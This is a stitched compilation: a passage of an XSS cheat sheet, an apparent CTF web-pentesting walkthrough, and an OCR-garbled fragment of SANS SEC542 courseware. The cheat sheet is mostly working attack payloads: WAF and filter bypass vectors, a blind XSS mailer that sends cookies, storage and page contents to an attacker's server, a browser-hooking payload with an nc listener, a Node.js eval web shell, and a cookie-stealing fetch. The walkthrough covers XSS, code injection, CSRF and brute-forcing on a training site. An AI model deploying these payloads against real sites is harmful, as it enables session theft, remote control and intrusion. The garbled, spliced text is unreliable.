Use to bypass FILTER_VALIDATE_EMAIL flag of PHP’s filter_var() function.
javascript://%250Aalert(1)
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 18
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
PHP URL Validation Bypass – Query Required 
Use to bypass FILTER_VALIDATE_EMAIL with FILTER_FLAG_QUERY_REQUIRED of PHP’s 
filter_var() function.
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0
(with domain filter)
javascript://https://DOMAIN/%250A1?alert(1):0
DOM Insertion via Server Side Reflection
Use when input is reflected into source and it can't execute by reflecting but by being 
inserted into DOM. Avoids browser filtering and WAFs.
\74svg o\156load\75alert\501\51\76 
XML-Based Vector for Bypass
Use to bypass browser filtering and WAFs in XML pages. Prepend a “-->” to payload if input
lands in a comment section or “]]>” if input lands in a CDATA section.
<_:script xmlns:_="http://www.w3.org/1999/xhtml">alert(1)</_:script>
Javascript Context - Code Injection (IE11/Edge Bypass)
Use to bypass Microsoft IE11 or Edge when injecting into javascript context.
';onerror=alert;throw 1//
HTML Context - Tag Injection (IE11/Edge XSS Bypass)
Use to bypass their native filter in multi reflection scenarios.
"'>confirm&lpar;1)</Script><Svg><Script/1=' 
Javascript Pseudo-Protocol Obfuscation
Use to bypass filters looking for javascript:alert(1). Be sure it can work (pass) with “1” before
adding alert(1) because this very payload might need some extra obfuscation to bypass 
filter completely. Last option only works with DOM manipulation of payload (like in 
Location Based Payloads or DOM-based XSS). Encode them properly in URLs.
javas&#99ript:1
javascript&colon;1
javascript&#9:1
&#1javascript:1
"javas%0Dcript:1"
%00javascript:1
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 19
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
AngularJS Injection (v1.6+)  – No Parentheses, Brackets or Quotes
Use to avoid filtering. First payload avoids parentheses, second one avoids brackets and the
last vector avoids quotes by using it in the same or in a separated injection point. Encode 
properly in URLs 
{{$new.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
&#123&#123$new.constructor('alert(1)')()&#125&#125
<x ng-init=a='alert(1)'>{{$new.constructor(a)()}}
Inside Comments Bypass
Vector to use if anything inside HTML comments are allowed (regex: /<!--.*-->/).
<!--><svg onload=alert(1)-->
Agnostic Event Handlers Vectors – Native Script Based
Vectors with event handlers that can be used with arbitrary tag names useful to bypass 
blacklists. They require some script loaded in page after the point of injection in source 
code. Keep in mind that using existing tag names like “<b” for below handlers might be the 
only way to trigger in some scenarios. 
<x onafterscriptexecute=alert(1)>                                                                                                    
<x onbeforescriptexecute=alert(1)>
Agnostic Event Handlers Vectors – CSS3 Based  
Vectors with event handlers that can be used with arbitrary tag names useful to bypass 
blacklists. They require CSS in the form of <style> or importing stylesheet with <link>. Last 
four ones work only in Firefox.
<x onanimationend=alert(1)><style>x{animation:s}@keyframes s{}
<x onanimationstart=alert(1)><style>x{animation:s}@keyframes s{}
<x onwebkitanimationend=alert(1)><style>x{animation:s}@keyframes s{}
<x onwebkitanimationstart=alert(1)><style>x{animation:s}@keyframes s{}
<x ontransitionend=alert(1)><style>*{transition:color 1s}*:hover{color:red}
<x ontransitionrun=alert(1)><style>*{transition:color 1s}*:hover{color:red}
<x ontransitionstart=alert(1)><style>*{transition:color 1s}*:hover{color:red}
<x ontransitioncancel=alert(1)><style>*{transition:color 1s}*:hover{color:red}
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 20
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Remote Script Call
Use when you need to call an external script but XSS vector is an handler-based one (like 
<svg onload=) or in javascript injections. The “brutelogic.com.br” domain along with HTML 
and js files are used as examples. If “>” is being filtered somehow, replace “r=>” or “w=>” for
“function()”. 
=> HTML-based 
(response must be HTML with an Access-Control-Allow-Origin (CORS) header)
"var x=new XMLHttpRequest();x.open('GET','//brutelogic.com.br/0.php');x.send();
x.onreadystatechange=function(){if(this.readyState==4){write(x.responseText)}}"
fetch('//brutelogic.com.br/0.php').then(r=>{r.text().then(w=>{write(w)})})
(with fully loaded JQuery library)
$.get('//brutelogic.com.br/0.php',r=>{write(r)})
=> Javascript-based 
(response must be javascript)
with(document)body.appendChild(createElement('script')).src='//brutelogic.com.br/2.js'
(with fully loaded JQuery library)
$.getScript('//brutelogic.com.br/2.js')
(CORS and js extension required)
import('//domain/file')
Invisible Foreign XSS Embedding
Use to load a XSS from another domain (or subdomain) into the current one. Restricted by 
target’s X-Frame-Options (XFO) header. Example below alerts in brutelogic.com.br context 
regardless of domain. 
<iframe src="//brutelogic.com.br/xss.php?a=<svg onload=alert(document.domain)>" 
style=display:none></iframe>
Simple Virtual Defacement 
Use to change how site will appear to victim providing HTML code. In the example below a 
“Not Found” message is displayed.
documentElement.innerHTML='<h1>Not Found</h1>'
                         
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 21
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Blind XSS Mailer
Use it as a blind XSS remote script saving as PHP file and changing $to and $headers vars 
accordingly. A working mail server like Postfix is required.
<?php header("Content-type: application/javascript"); ?>
var mailer = '<?= "//" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"] ?>';
var msg = 'USER AGENT\n' + navigator.userAgent + '\n\nTARGET URL\n' + document.URL; 
msg += '\n\nREFERRER URL\n' + document.referrer + '\n\nREADABLE COOKIES\n' + 
document.cookie;
msg += '\n\nSESSION STORAGE\n' + JSON.stringify(sessionStorage) + '\n\nLOCAL 
STORAGE\n' + JSON.stringify(localStorage); 
msg += '\n\nFULL DOCUMENT\n' + document.documentElement.innerHTML;
var r = new XMLHttpRequest();
r.open('POST', mailer, true);
r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
r.send('origin=' + document.location.origin + '&msg=' + encodeURIComponent(msg));
<?php
header("Access-Control-Allow-Origin: " . $_POST["origin"]);
$origin = $_POST["origin"];
$to = "myName@myDomain";
$subject = "XSS Blind Report for " . $origin;
$ip = "Requester: " . $_SERVER["REMOTE_ADDR"] . "\nForwarded For: ". 
$_SERVER["HTTP_X_FORWARDED_FOR"];
$msg = $subject . "\n\nIP ADDRESS\n" . $ip . "\n\n" . $_POST["msg"];
$headers = "From: report@myDomain" . "\r\n";
if ($origin && $msg) mail($to, $subject, $msg, $headers);
?>
Browser Remote Control
Use to hook browser and send javascript commands to it interactively. Use the javascript 
code below instead of alert(1) in your injection with an Unix-like terminal open with the 
following shell script (listener). Provide a HOST as a hostname, IP address or domain to 
receive commands from attacker machine.
=> Javascript (payload):
setInterval(function(){with(document)body.
appendChild(createElement('script')).src='//HOST:5855'},100)
=> Listener (terminal command):
$ while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 22
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Node.js Web Shell 
Use to create a web shell in vulnerable Node.js applications. After running payload below 
use shell in the following way: http://target:5855/?cmd=my_node.js_command 
Example to pop calc: cmd=require('child_process').exec('gnome-calculator').
require('http').createServer(function(req,res){res.end(1-
eval(require('url').parse(req.url,1).query.cmd))}).listen(5855)
Cookie Stealing
Use to get all cookies from victim user set by target site. It can’t get cookies protected by 
httpOnly security flag. Encode “+” as “%2B” in URLs.
fetch('//brutelogic.com.br/?c='+document.cookie)
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 23
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
XSS Online Test Page
Use to practice XSS vectors and payloads. Check source code for injection points.
https://brutelogic.com.br/xss.php
HTML Entities Table
Use to HTML encode chars.
https://brutelogic.com.br/utils/charref.htm
Multi-Case HTML Injection
Use as one-shot to have higher successful XSS rates. It works in all cases of the HTML 
context (see Basics section), including the JS one with tag injection. Notice the spaces as 
failover for simple sanitizing/escaping performed by app.
</Script/"'--><Body /Autofocus /OnFocus = confirm`1` <!--> 
Multi-Case HTML Injection - Base64 
Use as one-shot to have higher successful XSS rates in Base64 input fields. It works in all 
cases of the HTML context (see Basics section), including the JS one with tag injection.
PC9TY3JpcHQvIictLT48Qm9keSAvQXV0b2ZvY3VzIC9PbkZvY3VzID0gY29uZmlybWAxYC
A8IS0tPg==
Vectors for Fixed Input Length
Use when input must have a fixed length like in most common following hashes. 
MD5       12345678901<svg/onload=alert(1)>
SHA1      1234567890123456789<svg/onload=alert(1)>
SHA256  1234567890123456789012345678901234567890123<svg/onload=alert(1)>
PHP Sanitizing for XSS 
Use to prevent XSS in every context as long as input does not reflect in non-delimited 
strings, in the middle of backticks or any other eval-like function (all those in JS context). It 
does not prevent against DOM-based XSS, only source-based XSS cases.
 
$input = preg_replace("/:|\\\/", "", htmlentities($input, ENT_QUOTES))
JavaScript Execution Delay
Use when a javascript library or any other required resource for injection is not fully loaded 
in the execution of payload. A JQuery-based external call is used as example.
onload=function(){$.getScript('//brutelogic.com.br/2.js')}
onload=x=>$.getScript('//brutelogic.com.br/2.js')
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 24
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Image Vectors - Alternative Event Handlers 
Use to trigger image vectors with event handlers different than onerror.
<img 
<image
                                                           
src=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs= 
srcset=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=
onload=alert(1)>
onloadend=alert(1)>
onloadstart=alert(1)>
Shortest XSS
Use when you have a limited slot for injection. Requires a native script (present in source 
code already) called with relative path placed after where injection lands. Attacker server 
must reply with attacking script to the exact request done by native script (same path) or 
within a default 404 page (easier). The shorter domain is, the better.
<base href=//knoxss.me>
Mobile-only Event Handlers
Use when targeting mobile applications.
<html ontouchstart=alert(1)> 
<html ontouchend=alert(1)> 
<html ontouchmove=alert(1)> 
<body onorientationchange=alert(1)>
Body Tag
A collection of body vectors. Last one works only for Internet Explorer.
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<body onhashchange=alert(1)><meta content=URL;%23 http-equiv=refresh>
<body onscroll=alert(1) style=overflow:auto;height:1000px id=x>#x
<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><x id=x>#x
<body onresize=alert(1)>press F12!
<body onhelp=alert(1)>press F1! 
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 25
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Less Known XSS Vectors
A collection of less known XSS vectors.
<marquee onstart=alert(1)>
<audio src onloadstart=alert(1)>
<video onloadstart=alert(1)><source>
<video ontimeupdate=alert(1) controls src=//brutelogic.com.br/x.mp4>
<input autofocus onblur=alert(1)>
<keygen autofocus onfocus=alert(1)>
<form onsubmit=alert(1)><input type=submit>
<select onchange=alert(1)><option>1<option>2
<menu id=x contextmenu=x onshow=alert(1)>right click me!
<object onerror=alert(1)>
Alternative PoC - Shake Your Body
Use to shake all the elements of the page as a good visualization of the vulnerability.
setInterval(x=>{b=document.body.style,b.marginTop=(b.marginTop=='4px')?'-4px':'4px';},5)
Alternative PoC - Brutality
Use to display an image of Mortal Kombat’s Sub-Zero character along with a “brutality” 
game sound.
d=document,i=d.createElement('img');i.src='//brutelogic.com.br/brutality.jpg';
d.body.insertBefore(i,d.body.firstChild);new(Audio)('//brutelogic.com.br/brutality.mp3').play();
Alternative PoC - Alert Hidden Values
Use to prove that all hidden HTML values like tokens and nonces in target page can be stolen.
f=document.forms;for(i=0;i<f.length;i++){e=f[i].elements;for(n in e){if(e[n].type=='hidden')
{alert(e[n].name+': '+e[n].value)}}}
Improved Likelihood of Mouse Events
Use to create a larger area for mouse events to trigger. Add the following (as an attribute) 
inside any XSS vector that makes use of mouse events like onmouseover, onclick, etc.
style=position:fixed;top:0;left:0;font-size:999px
Alternative to Style Tag 
Use when “style” keyword is blocked either for inline and tag name. Provide HOST and FILE
for CSS or just the CSS alone in 2nd vector.
<link rel=stylesheet href=//HOST/FILE>
<link rel=stylesheet href=data:text/css,CSS>
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 26
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Cross-Origin Script - CrossPwn 
Save content below as .html file and use as following: 
http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/
status.html&msg=<script>alert(document.domain)
Where “facebook.com” is an allowed origin and “localhost” is attacking domain, 
“//brutelogic.com.br/tests/status.html” is target page and “<script>alert(document.domain)” 
is message sent (payload).
Code
<!DOCTYPE html>
<body onload="CrossPwn()"> 
<h2>CrossPwn</h2>
<p>OnMessage XSS</p>
<p>Use target & msg as URL parameters.</p>
<iframe id="f" height="0" style="visibility:hidden">
</iframe>
<script>
   searchParams = new URLSearchParams(document.location.search);
   target = searchParams.get('target');
   msg = searchParams.get('msg');
   document.getElementById('f').setAttribute('src', target);
   function CrossPwn() {frames[0].postMessage(msg,'*')}
</script>
</body>
</html>
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 27
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Location Based Payloads
The following XSS vectors use a more elaborated way to execute the payload making use of
document properties to feed another document property, the location one.
That leads to complex vectors which can be very useful to bypass filters and WAFs. 
Because they use arbitrary tags (XHTML), any of the Agnostic Event Handlers seen before 
can be used. Here, “onmouseover” will be used as default.   
Encode the plus sign (+) as %2B in URLs.
Location Basics
Vectors with simpler manipulation to achieve the redirection to javascript pseudo-protocol.
<j/onmouseover=location=innerHTML>javascript:alert(1)//
<iframe id=t:alert(1) name=javascrip onload=location=name+id>
Location with URL Fragment 
It’s required to use the vector with an unencoded # sign. If used in POST requests, URL 
fragment must be used in action URL.  
<javascript/onmouseover=location=tagName+innerHTML+location.hash>:/*hoverme!
</javascript>#*/alert(1)
<javascript/onmouseover=location=tagName+innerHTML+location.hash>:'hoverme!
</javascript>#'-alert(1)
<javascript:'-`/onmouseover=location=tagName+URL>hoverme!#`-alert(1)
<j/onmouseover=location=innerHTML+URL>javascript:'-`hoverme!</j>#`-alert(1)
<javas/onmouseover=location=tagName+innerHTML+URL>cript:'-`hoverme!</javas>
#`-alert(1)
<javascript:/onmouseover=location=tagName+URL>hoverme!#%0Aalert(1)
<j/onmouseover=location=innerHTML+URL>javascript:</j>#%0Aalert(1)
<javas/onmouseover=location=tagName+innerHTML+URL>cript:</javas>#%0Aalert(1)
Location with Leading Alert
`-alert(1)<javascript:`/
onmouseover=location=tagName+previousSibling.nodeValue>hoverme!
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 28
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
`-alert(1)<javas/
onmouseover=location=tagName+innerHTML+previousSibling.nodeValue>cript:`hoverme!
<alert(1)<!--/onmouseover=location=innerHTML+outerHTML>javascript:1/*hoverme!*/
</alert(1)<!-->
<j/1="*/""-alert(1)<!--/onmouseover=location=innerHTML+outerHTML>
javascript:/*hoverme!
*/"<j/1=/alert(1)//onmouseover=location=innerHTML+
previousSibling.nodeValue+outerHTML>javascript:/*hoverme!
Location with Self URL (last is FF Only)
It’s required to replace [P} with the vulnerable parameter where input is used. Encode “&” as
%26 in URLs.
<svg id=?[P]=<svg/onload=alert(1)+ onload=location=id>
<j/onmouseover=location=textContent>?[P]=&lt;svg/onload=alert(1)>hoverme!</j>
<j/onmouseover=location+=textContent>&[P]=&lt;svg/onload=alert(1)>hoverme!</j>
<j&[P]=<svg+onload=alert(1)/onmouseover=location+=outerHTML>hoverme!
</j&[P]=<svg+onload=alert(1)>
&[P]=&lt;svg/onload=alert(1)><j/
onmouseover=location+=document.body.textContent>hoverme!</j>
Location with Template Literal
${alert(1)}<javascript:`//onmouseover=location=tagName+URL>hoverme!
${alert(1)}<j/onmouseover=location=innerHTML+URL>javascript:`//hoverme!
${alert(1)}<javas/onmouseover=location=tagName+innerHTML+URL>cript:`//hoverme!
${alert(1)}`<javascript:`//
onmouseover=location=tagName+previousSibling.nodeValue>hoverme!
${alert(1)}`<javas/
onmouseover=location=tagName+innerHTML+previousSibling.nodeValue>cript:`hoverme!
    
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 29
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Inner & Outer HTML Properties Alternative 
These last vectors make use of innerHTML and outerHTML properties of elements to get 
the same result as the location ones. But they requre to create a complete HTML vector 
instead of a “javascript:alert(1)” string. The following collections of elements can be used 
here with index 0 to make it easier to follow: all[0], anchors[0], embeds[0], forms[0], 
images[0], links[0] and scripts[0]. They all can replace head or body elements used below.
<svg id=<img/src/onerror&#61alert(1)&gt; onload=head.innerHTML=id>
<svg id=<img/src/onerror&#61alert(1)&gt; onload=body.outerHTML=id>
XSS Vector Schemes
There are basically 3 different schemes to build a HTML-based XSS vector. All chars and 
bytes used to separate the fields are shown in drop down according to a valid syntax. 
%0X means every byte from %00 up to %0F  as well as %1X. “ENT” means HTML ENTITY 
and it means that any of the allowed chars or bytes can be used in their HTML entity forms 
(string and numeric). 
Lastly, notice the “javascript” word might have some bytes in between or not and all of its 
characters can also be URL or HTML encoded. 
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 30
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Vector Scheme 1 (tag name + handler)
<name [    ] handler [    ] = [    ] js [    ]>
            %09              %09   %09    %09
            %0A              %0A   %0A   %0A
            %0C              %0C   %0B   %0B
            %0D              %0D  %0C   %0C
            %20              %20   %0D   %0D
            %2F              %20    %20 
               /                 %22    %22 
               +                 %27    %27 
                                     '           '
                                     "          "
                                     +         +
Vector Scheme 2 (tag name + attribute + handler)
<name [    ] attrib [    ] = [    ] value [    ] handler [    ] = [    ] js [    ]>
             %09         %09    %09         %09              %09   %09   %09 
             %0A         %0A   %0A         %0A              %0A   %0A  %0A 
             %0C         %0C   %0C         %0C              %0C  %0B  %0B 
             %0D         %0D  %0D         %0D             %0D   %0C  %0C
             %20          %20   %20         %20              %20   %0D  %0D
             %2F          %2F   %22         %22                         %20   %20
                /                /      %27         %27                         %22   %22
                +               +         '                '                             %27   %27
                                             "               "                     
  '          '
                                            +               +                               "         "
                                                                                              +         +
Vector Scheme 3 (tag name + href|src|data|action|formaction)
<name [    ] src [    ] = [    ] JAVAS[?]CRIPT [    ] :js [    ]>
             %09     %09   %0X          %09         %09    %09
             %0A     %0A  %1X           %0A        %0A    %0A 
             %0C     %0C  %20           %0D        %0D   %0B
             %0D     %0D %22            ENT         ENT   %0C
             %20      %20  %27                                       %0D
             %2F      %2F  ENT                                        %20 
                /            /       +                                           %22
                +           +                                                    %27  
                                                                                       '
                                                                                       "
                                                                                       +
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 31
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 32
1
Web Application 
Pentesting Project
To get started, visit this URL by clicking or copying and pasting it into your browser: 
http://ctf.infosecinstitute.com/ctf2/
You should see the welcome page:
Introduction
Hello and welcome to the Infosec Skills Web Application Pentesting Project! 
This project is based on the real Capture-the-Flag (CTF) bounty challenge hosted by Infosec. The bounties have been 
all claimed and paid but working on this project will give you an opportunity to see what it’s like to compete for real 
bounties by finding vulnerabilities.
2
The “Levels” button in the upper left corner allows you to navigate between levels. You may jump 
directly to any level. Levels don’t have to be completed in any specific order. Try to complete them all!
 
If you feel stuck, try clicking “Get a Hint” on the bottom of the page. 
3
When a level is completed successfully, you will receive a confirmation. 
 
Completed levels will be highlighted in green in the Levels selection menu.
Feel free to try different tools and even browsers when working on the challenges. All challenges are 
solvable with help of openly available tools and browser utilities.
Good luck! 
Level 1 
Level 1 consists of a cross-site scripting vulnerability. To begin, let’s see what happens when we  
use normal data.  
 
 
When we look at the HTML of the page, we can see our reflections are outside the HTML tags. So we will 
be using the characters “<” and “>” to inject malicious JavaScript.
Next, we will view the code in the JavaScript function ex1.js. 
1
4
As we can see, at lines 18 and 19 the values we put in for site and URL are trimmed and replaced. This is what 
will need to be changed in order for the web application to accept our malicious payload. 
Replace lines 18 and 19 with var siteName = $(“.ex1 input[type=’text’]”).val().trim(); and var siteURL = $(“.ex1 
input[type=’url’]”).val().trim();.
5
The only thing that is left is to add a malicious payload. For my example, I created an alert that says 
“hacked.” The full payload entered on the “site URL” field is http://mysite/<script>alert(“Hacked”)</script>.  
 
 
 
Success! On to level 2!
Level 2 
In this level, we use an injection vulnerability to compromise a web application calculator. 
 
2
6
If we try to use invalid operands, we get an error:  
 
We can try to look at code on the client side of this web application but won’t find anything. This means that  
the code is being evaluated server-side, so we will need to intercept the request and change it. 
To do this, start Burp Suite and make sure your intercept proxy is working correctly. We will use ;phpinfo(); to 
inject our code without breaking the rest. 
Once you have intercepted the information, change the bottom so it looks like the following: 
 
 
7
Once that is completed, you should receive a message that the level was completed. 
 
Level 3
This web application challenge revolves around getting ourselves admin access. The vulnerability we will 
use for this is a parameter delimiter.
If we continue to use our Burp Suite intercept proxy and try to add a newline to the POST data, we receive 
the following error:  
 
This indicates to us that the newline has something to do with the delimiter. Using all the common 
parameters yields nothing until we get to Register. If we use the following:  
 
3
8
… it returns the following: 
 
If we manipulate the bottom line to include the role of admin instead of “someothername,” we should be able 
to bypass the server-side check. The final POST should look like: 
 
It should result in the following: 
9
Level 4
In this level, we must load a PHP file in the root of infosecinstitute.com. Clicking any of the links redirects 
to ex.php?file=fileX.txt, where X can be 1, 2 or 3 depending on the page clicked. If we use something like 
http://infosecinstitute.com/random.php instead of using a filename of 1-3, we get the following error:  
 
 
 
We are on the right path; all that’s left is to change the payload. After trial and error, the final URL needed 
to complete the level is: 
http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=HTTP://infosecinstitute.com/file1.txt.php 
 
 
4
10
Level 5 
This level consists of trying to log in with a disabled login button. If we search the HTML of the page, we 
can see that the button is disabled:  
 
 
If we try to follow the login.html page, we get a 404 error.
So we have concluded that something must be changed in order to get to the login page. In Burp Suite, 
you’ll notice no extra cookies or headers in the responses, so it is possible that the webpage is checking 
the referrer before letting us continue. If we manipulate the GET to refer to the login.html page like so: 
  
 
5
11
… then we can complete the level: 
 
Level 6
The objective for this level is to use CSRF to craft a URL that transfers to someplace with the 
parameter 555.  
 
 
 
Creating a payload is easy. The one I created is http://site.com/bankphp?transferTo=555. So we have our 
payload, but we need to find a way to direct the webpage there. 
A safe bet is using the img tag (because browsers don’t usually check it) to insert our payload. If we use the 
tag:
 <img src=”http://site.com/bankphp?transferTo=555></img>
6
12
… we will be redirected to the complete page. 
 
 
13
Level 7
This is another cross-site scripting vulnerability and the objective is to add <h1>YOUR NAME</h1>.
If we look at the POST data, it looks malformed and awkward: 
 
 
The URL seems to be encoded. If we decode it, we eventually end up with
name=infosec&pass=qweqwe&action=/ctf2/exercises/ex7.php, where “name” and “password” are 
whatever you chose. If we look at the way the POST is constructed, the script looks like this:
 
 
7
14
That “exercises\/ex7.asp” seems to be the page we redirect to. After working with the URL and finding that 
our reflections are outputted without being escaped, we can use the payload 
http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php/a=’><h1>Infosec</h1> to complete the challenge. 
 
Level 8
In this level, we need to upload and include a filename. If we try to upload JavaScript, we get the error 
“Your file does not have the proper extension”. To mitigate this error, we simply change the content type 
from application/x-javascript to text/plain. The final form data looks like the following:  
 
So we have our file poc.png.js uploaded, but we need to include it. If we try to upload images normally, we 
8
15
get the URL http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?attachment_id=1, where attachment_
id=1 is the attachment incremented. If we replace the attachment ID with our file and use the URL http://
ctf.infosecinstitute.com/ctf2/exercises/ex8.php?file=poc.png.js, we redirect to the complete page. 
 
Level 9
The objective of this level is to switch from John Doe to Mary Jane.
If we intercept traffic with Burp Suite, we’ll notice that the web server is on a cookie: 
 
If we URL decode that user string and decode that from Base64, we get JOHN+DOE. This is what must 
change in order to get to Mary Jane. So if we take MARY+JANE and Base64-encode it (TUFSWStKQU5F), 
9
16
then take that result and substitute it for the user like so 
 
:
 
… we complete the level:
 
Level 10
There are two objectives to this level. The first is to beat the game over 9,999 times and to beat it on 
extreme.
The first thing we will want to do is explore the source code of app.js.
10
17
 
If we notice line 39, this is the method that is updating our user statistics. This is what we need to change 
in order to get all our wins without playing over 9,999 times. If we load the method and input the values we 
want, we can get our 9,999 wins: 
 
 
 
18
To beat the game on extreme, I did something unorthodox. Just as the squares flashed to indicate their 
colors for extreme difficulty, I would take a quick screenshot and simply refer to it to beat the level on 
extreme. Once both of these tasks were completed, I got a success indicator: 
 
Level 11
This level is rather simple. If we try to log in and look at our Burp Suite interceptor, we see the following 
as a response to our request:  
 
We notice the welcome is indicated as “no.” All that’s left to do is go to Burp Suite Repeater and change 
the welcome to “yes”: 
 
11
19
We then receive an indication that we beat the level:
 
Level 12
In this level, we will attempt to log into the admin account by brute-force password cracking. To begin, 
intercept and create a dummy form and have a payload be put where the password field goes:  
 
 
12
20
I used 500 of the worst passwords as my payload. After a while, I received the following, indicating that we 
cracked the password 
 
 
 
21
Level 13
This is the final level and has us redirecting to another page. If we look at where we are redirected for this 
page, we get the following:  
 
The ex13-task.php is what we will need to change to complete the level. The level calls on us to redirect to 
another domain. So if we replace ex13-task.php with some other domain and add it to the URL like so: 
http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=//somedomain.net/
… we complete the level: 
13
, 
~ 
-- 
- 
- 
- 
- 
561)542 f: WES APP PENETMrTION mr&sTING AND BHl6B HAel<ING 
~- 
- 
~ 
- 
~ 
542.2 
ration, 
n 
n 
Copyright© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson. All rights reserved to Seth Misenar, Eric 
Conrad, Kevin Johnson, and/or SANS Institute. 
PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE 
AGREEMENT ("CLA") CAREFULLY BEFORE USING ANY OF THE COURSEWARE 
ASSOCIATED WITH THE SANS COURSE. THIS IS A LEGAL AND ENFORCEABLE CONTRACT 
BETWEEN YOU (THE "USER") AND THE SANS INSTITUTE FOR THE COURSEWARE. YOU 
AGREE THAT THIS AGREEMENT IS ENFORCEABLE LIKE ANY WRITTEN NEGOTIATED 
AGREEMENT SIGNED BY YOU. 
With the CLA, the SANS Institute hereby grants User a personal, non-exclusive license to use the 
Courseware subject to the terms of this agreement. Courseware includes all printed materials, 
including course books and lab workbooks, as well as any digital or other media, virtual machines, 
and/or data sets distributed by the SANS Institute to the User for use in the SANS class 
associated with the Courseware. User agrees that the CLA is the complete and exclusive 
statement of agreement between The SANS Institute and you and that this CLA supersedes any 
oral or written proposal, agreement or other communication relating to the subject matter of this 
CLA. 
BY ACCEPTING THIS COURSEWARE, YOU AGREE TO BE BOUND BY THE TERMS OF THIS 
CLA. BY ACCEPTING THIS SOFTWARE, YOU AGREE THAT ANY BREACH OF THE TERMS 
OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT INJURY TO THE SANS 
INSTITUTE, AND THAT THE SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY 
INJUNCTION (WITHOUT THE NECESSITY OF POSTING BOND), SPECIFIC PERFORMANCE, 
OR OTHER EQUITABLE RELIEF. 
If you do not agree, you may return the Courseware to the SANS Institute for a full refund, if 
applicable. 
User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works 
based upon all or any portion of the Courseware, in any medium whether printed, electronic or 
otherwise, for any purpose, without the express prior written consent of the SANS Institute. 
Additionally, User may not sell, rent, lease, trade, or otherwise transfer the Courseware in any 
way, shape, or form without the express written consent of the SANS Institute. 
If any provision of this CLA is declared unenforceable in any jurisdiction, then such provision shall 
be deemed to be severable from this CLA and shall not affect the remainder thereof. An 
amendment or addendum to this CLA may accompany this courseware. 
SANS acknowledges that any and all software and/or tools, graphics, images, tables, charts or 
graphs presented in this courseware are the sole property of their respective 
trademark/registered/copyright owners, including: 
AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Back 
to My Mac, Boot Camp, Cocoa, FaceTime, FileVault, Finder, FireWire, FireWire logo, iCal, iChat, 
ilife, iMac, iMessage, iPad, iPad Air, iPad Mini, iPhone, iPhoto, iPod, iPod classic, iPod shuffle, 
iPod nano, iPod touch, iTunes, iTunes logo, iWork, Keychain, Keynote, Mac, Mac Logo, MacBook, 
MacBook Air, MacBook Pro, Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, 
Retina, Safari, Siri, Spaces, Spotlight, There's an app for that, Time Capsule, Time Machine, 
Touch ID, Xcode, Xserve, App Store, and iCloud are registered trademarks of Apple Inc. 
Governing Law: This Agreement shall be governed by the laws of the State of Maryland, USA. 
SEC542_2_D01_01 
\...., 
'-' 
'-._./ 
'-._./ 
'-._./ 
'-._./ 
'-._./ 
\_, · 
'-..,/ 
\...., 
'-._./ 
'-' 
'-._./ 
'----' 
'-._./
'-._./ 
'-._./ 
\....,
'-..,· 
'-._./ 
'-._./ 
'-' 
\....,
'-' 
\....,
\....,
'- 
'-' 
'-' 
'-'
'-- 
'-'
'-'
'-'
'--
'---' 
'-- 
'--' 
'--
\....,
SEC542.2 
s 
Configuration, Identity, 
and Authorization Testing 
Copyright 2018 Seth Misenar (GSE #28), Eric Conrad (GSE #13), Kevin Johnson 
Version DO f O I 
Welcome to SANS Security 542, Day 2! 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-...,/ 
Enterprise Threat and 
Vulnerability Assessment 
SEC642 
Advanced Web App Penetration 
Testing.& Ethical Hacking 
SEC660 
Advanced Penetration Testing 
& Ethical Hacking 
SEC760 
Advanced Exploit Development 
for Penetration Testers 
Active Defense, Offensive 
